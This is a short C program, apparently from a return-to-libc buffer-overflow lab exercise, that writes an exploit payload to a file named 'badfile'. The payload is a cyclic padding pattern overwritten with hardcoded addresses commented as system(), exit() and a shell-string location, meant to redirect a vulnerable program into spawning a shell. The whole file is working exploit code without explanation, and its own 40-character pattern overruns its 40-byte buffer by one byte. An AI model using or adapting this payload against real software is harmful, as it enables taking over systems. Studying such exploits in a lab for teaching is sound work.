/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
	char buf[40];
	FILE *badfile;
	badfile = fopen("./badfile", "w");

	char testcode[] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A";
	sprintf(buf, "%s", testcode);
	sprintf(&buf[24], "%s", "\x30\xf4\xe5\xb7"); //system
	sprintf(&buf[28], "%s", "\xb0\x2f\xe5\xb7"); //exit 0xb7e52fb0
	sprintf(&buf[32], "%s", "\x6a\xff\xff\xbf"); //shellcode 0xbfffff6a

	
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}
